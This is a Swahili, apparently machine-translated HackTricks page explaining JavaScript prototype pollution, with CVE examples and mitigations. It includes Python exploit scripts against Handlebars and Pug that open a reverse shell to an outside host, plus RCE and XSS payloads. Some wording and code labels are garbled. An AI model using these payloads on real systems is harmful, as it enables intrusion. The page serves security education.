# NodeJS - \_\_proto\_\_ & Uundaji wa Mfano

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Vitu katika JavaScript <a href="#053a" id="053a"></a>

Vitu katika JavaScript ni mkusanyiko wa jozi za ufunguo-na-thamani, inayojulikana kama mali. Kifaa kinaweza kuundwa kwa kutumia `Object.create` na `null` kama hoja ili kuzalisha kifaa tupu. Njia hii inaruhusu uundaji wa kifaa bila mali zozote zilizorithiwa.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Kitu kisicho na maudhui ni sawa na kamusi tupu, kinawakilishwa kama `{}`.

### Kazi na Darasa katika JavaScript

Katika JavaScript, kazi na darasa zina uhusiano wa karibu, na kazi mara nyingi zikitumika kama wajenzi wa darasa. Ingawa JavaScript haina msaada wa asili wa darasa, wajenzi wanaweza kufanana na tabia ya darasa.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Mifano katika JavaScript

JavaScript inaruhusu kubadilisha, kuongeza, au kufuta sifa za prototipi wakati wa utekelezaji. Uwezo huu unawezesha upanuzi wa kazi za darasa kwa njia ya kudumu.

Kazi kama `toString` na `valueOf` zinaweza kubadilishwa ili kubadilisha tabia zao, hii inaonyesha uwezo wa kubadilika wa mfumo wa prototipi wa JavaScript.

## Urithi

Katika programu inayotegemea prototipi, mali/mbinu zinarithiwa na vitu kutoka kwa darasa. Darasa hizi hujengwa kwa kuongeza mali/mbinu kwa kielelezo kingine au kwa kielelezo tupu.

Inafaa kuzingatia kwamba wakati mali inapoongezwa kwa kielelezo kinachotumika kama prototipi kwa vitu vingine (kama `myPersonObj`), vitu vinavyorithi vitapata ufikiaji wa mali hii mpya. Hata hivyo, mali hii haionyeshwi moja kwa moja isipokuwa inaitwa wazi.

## Uchafuzi wa \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

## Kuchunguza Uchafuzi wa Prototipi katika JavaScript

Vitu vya JavaScript vinafafanuliwa kwa njia ya jozi za funguo-na-thamani na vinarithi kutoka kwa kielelezo cha JavaScript Object. Hii inamaanisha kwamba kubadilisha kielelezo cha Object kunaweza kuathiri vitu vyote katika mazingira.

Tutatumia mfano tofauti kuonyesha hili:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Upatikanaji wa kigezo cha Object niwezekanavyo kupitia:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Kwa kuongeza mali kwa kigezo cha Object, kila kifaa cha JavaScript kitarithi mali hizi mpya:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## uchafuzi wa mfano

Kwa hali ambapo matumizi ya `__proto__` yanazuiliwa, kubadilisha mfano wa kazi ni mbadala:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Hii inaathiri vitu vilivyoundwa kutoka kwa kujenga kwa `Vehicle`, ikitoa mali za `beep`, `hasWheels`, `honk`, na `isElectric`.

Njia mbili za kuathiri vitu vya JavaScript kwa njia ya uchafuzi wa kielelezo ni pamoja na:

1. Kuchafua moja kwa moja `Object.prototype`:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Kuchafua mfano wa kujenga kwa muundo unaotumiwa mara kwa mara:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Baada ya hatua hizi, kila kitu cha JavaScript kinaweza kutekeleza njia za `goodbye` na `greet`.

## Kuchafua vitu vingine

### Kutoka darasa hadi Object.prototype

Katika hali ambapo unaweza **kuchafua kitu maalum** na unahitaji **kufikia `Object.prototype`**, unaweza kutafuta kwa kutumia namna kama ifuatavyo:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Uchafuzi wa Vipengele vya Mfumo wa Array

Tambua kwamba unaweza kuchafua sifa za vitu katika JS, ikiwa una ufikiaji wa kuchafua mfumo wa array unaweza pia **kuchafua thamani za array** inayopatikana **kwa kutumia indeksi** (tambua kwamba huwezi kuandika tena thamani, hivyo unahitaji kuchafua indeksi ambazo zinatumika kwa njia fulani lakini hazijaandikwa).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Uchafuzi wa vipengele vya Html

Wakati wa kuzalisha kipengele cha HTML kupitia JS, ni **inawezekana** **kubadilisha** sifa ya **`innerHTML`** ili kuandika **msimbo wa HTML usio na kikomo.** [Wazo na mfano kutoka kwenye chapisho hili](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Mifano

### Mfano wa Msingi

Uchafuzi wa kigezo unatokea kutokana na kasoro katika programu ambayo inaruhusu kuandika upya mali kwenye `Object.prototype`. Hii inamaanisha kwamba tangu vitu vingi vinapata mali zao kutoka `Object.prototype`

Mfano rahisi ni kuongeza thamani kwa **mali isiyofafanuliwa ya kigezo** ambayo itakaguliwa, kama vile:
```javascript
if (user.admin) {
```
Ikiwa sifa **`admin` haijatangazwa**, inawezekana kutumia PP na kuweka kuwa Kweli kwa kutumia kitu kama:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Mfumo uliopo nyuma ya hii ni kwa kubadilisha mali ili ikiwa mshambuliaji ana udhibiti juu ya pembejeo fulani, wanaweza kubadilisha mfano wa vitu vyote katika programu. Udanganyifu huu kawaida unahusisha kuweka mali ya `__proto__`, ambayo, katika JavaScript, inalingana na kubadilisha moja kwa moja mfano wa vitu.

Mazingira ambayo shambulio hili linaweza kutekelezwa kwa mafanikio, kama ilivyoelezwa katika [utafiti](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf) maalum, ni pamoja na:

- Kufanya muunganisho wa kurekursi.
- Kuweka mali kulingana na njia.
- Kuzaliana vitu.


### Kubadilisha kazi
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Uchafuzi kwa RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Uchafuzi wa Prototype wa Upande wa Mteja kwa XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Shambulio la uchafuzi wa Prototype kupitia jQuery $ .extend

[Kwa maelezo zaidi angalia makala hii](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
Katika jQuery, kazi ya `$ .extend` inaweza kusababisha uchafuzi wa prototype ikiwa kipengele cha nakala ya kina kinatumika vibaya. Kazi hii mara nyingi hutumiwa kwa kunakili vitu au kuunganisha mali kutoka kwa kitu cha msingi. Walakini, wakati inapowekwa vibaya, mali zilizokusudiwa kwa kitu kipya zinaweza kupewa kwa prototype badala yake. Kwa mfano:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Mkato huu, uliojulikana kama CVE-2019-11358, unaonyesha jinsi nakala ya kina inaweza kubadilisha kwa bahati mbaya mfano, ikisababisha hatari za usalama, kama ufikiaji usiothibitishwa wa admin ikiwa mali kama `isAdmin` zinathibitishwa bila uthibitisho sahihi wa uwepo.

### CVE-2018-3721, CVE-2019-10744: Shambulio la uchafuzi wa mfano kupitia lodash

[Kwa maelezo zaidi angalia makala hii](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) ilikumbana na udhaifu sawa wa uchafuzi wa mfano (CVE-2018-3721, CVE-2019-10744). Masuala haya yalitatuliwa katika toleo 4.17.11.

### Mafunzo mengine na CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Uchafuzi wa Mfano wa AST katika NodeJS

NodeJS inatumia sana Miti ya Muhtasari ya Kifungu (AST) katika JavaScript kwa kazi kama injini za templeti na TypeScript. Sehemu hii inachunguza udhaifu unaohusiana na uchafuzi wa mfano katika injini za templeti, haswa Handlebars na Pug.

#### Uchambuzi wa Udhaifu wa Handlebars

Injini ya templeti ya Handlebars inaweza kushambuliwa na uchafuzi wa mfano. Udhaifu huu unatokea kutokana na kazi maalum ndani ya faili ya `javascript-compiler.js`. Kwa mfano, kazi ya `appendContent` inaunganisha `pendingContent` ikiwepo, wakati kazi ya `pushSource` inarejesha `pendingContent` kuwa `undefined` baada ya kuongeza chanzo.

##### Mchakato wa Ushambulizi

Ushambulizi unatumia Mti wa Muhtasari wa Kifungu (AST) uliotengenezwa na Handlebars, ukifuata hatua hizi:

1. **Ubadilishaji wa Parser**: Kwanza, parser, kupitia kipengele cha `NumberLiteral`, inahakikisha kuwa thamani ni nambari. Uchafuzi wa mfano unaweza kuzunguka hii, kuruhusu uingizaji wa herufi zisizo za nambari.
2. **Kushughulikiwa na Compiler**: Compiler inaweza kusindika Kifungu cha AST au templeti ya herufi. Ikiwa `input.type` inalingana na `Program`, kuingia kunachukuliwa kama tayari imechambuliwa, ambayo inaweza kushambuliwa.
3. **Uingizaji wa Kanuni**: Kwa kubadilisha `Object.prototype`, mtu anaweza kuingiza kanuni isiyo na kikomo kwenye kazi ya templeti, ambayo inaweza kusababisha utekelezaji wa kanuni kwa mbali.

Mfano unaodhihirisha ushambulizi wa udhaifu wa Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Msimbo huu unaonyesha jinsi mshambuliaji anaweza kuingiza msimbo usio na kikomo katika kigezo cha Handlebars.

**Marejeleo ya Nje**: Tatizo linalohusiana na uchafuzi wa mfano uligunduliwa katika maktaba ya 'flat', kama ilivyoelezwa hapa: [Tatizo kwenye GitHub](https://github.com/hughsk/flat/issues/105).

**Marejeleo ya Nje**: [Tatizo linalohusiana na uchafuzi wa mfano katika maktaba ya 'flat'](https://github.com/hughsk/flat/issues/105)

Mfano wa uchexploit wa uchafuzi wa mfano katika Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug Udhaifu

Pug, injini nyingine ya templeti, inakabiliwa na hatari sawa ya uchafuzi wa prototype. Maelezo ya kina yanapatikana katika mjadala juu ya [AST Injection katika Pug](https://blog.p6.is/AST-Injection/#Pug).

Mfano wa uchafuzi wa prototype katika Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Hatua za Kuzuia

Ili kupunguza hatari ya uchafuzi wa protini, mikakati iliyoorodheshwa hapa chini inaweza kutumika:

1. **Usiobadilika wa Vitu**: `Object.prototype` inaweza kufanywa isiyo na mabadiliko kwa kutumia `Object.freeze`.
2. **Uthibitishaji wa Kuingia**: Kuingia kwa JSON inapaswa kuthibitishwa kwa uangalifu dhidi ya muundo wa programu.
3. **Kazi Salama za Kuchanganya**: Matumizi hatari ya kazi za kuchanganya za kurudia lazima yepukwe.
4. **Vitu Visivyo na Protini**: Vitu bila mali za protini vinaweza kuundwa kwa kutumia `Object.create(null)`.
5. **Matumizi ya Ramani**: Badala ya `Object`, `Map` inapaswa kutumika kuhifadhi jozi za funguo-na-thamani.
6. **Visasisho vya Maktaba**: Maboresho ya usalama yanaweza kuingizwa kwa kusasisha mara kwa mara maktaba.
7. **Zana za Linter na Uchambuzi Statis**: Tumia zana kama ESLint na programu-jalizi sahihi kugundua na kuzuia udhaifu wa uchafuzi wa protini.
8. **Mapitio ya Kanuni**: Tekeleza mapitio kamili ya kanuni ili kutambua na kurekebisha hatari za uwezekano zinazohusiana na uchafuzi wa protini.
9. **Mafunzo ya Usalama**: Elimisha watengenezaji kuhusu hatari za uchafuzi wa protini na mazoea bora ya kuandika kanuni salama.
10. **Matumizi ya Maktaba kwa Tahadhari**: Kuwa mwangalifu wakati wa kutumia maktaba za watu wa tatu. Tathmini hali yao ya usalama na ukague kanuni yao, haswa zile zinazobadilisha vitu.
11. **Ulinzi wa Wakati wa Uendeshaji**: Tumia mbinu za ulinzi wa wakati wa uendeshaji kama kutumia pakiti za npm zinazolenga usalama ambazo zinaweza kugundua na kuzuia mashambulizi ya uchafuzi wa protini.

## Marejeo

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inayotangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
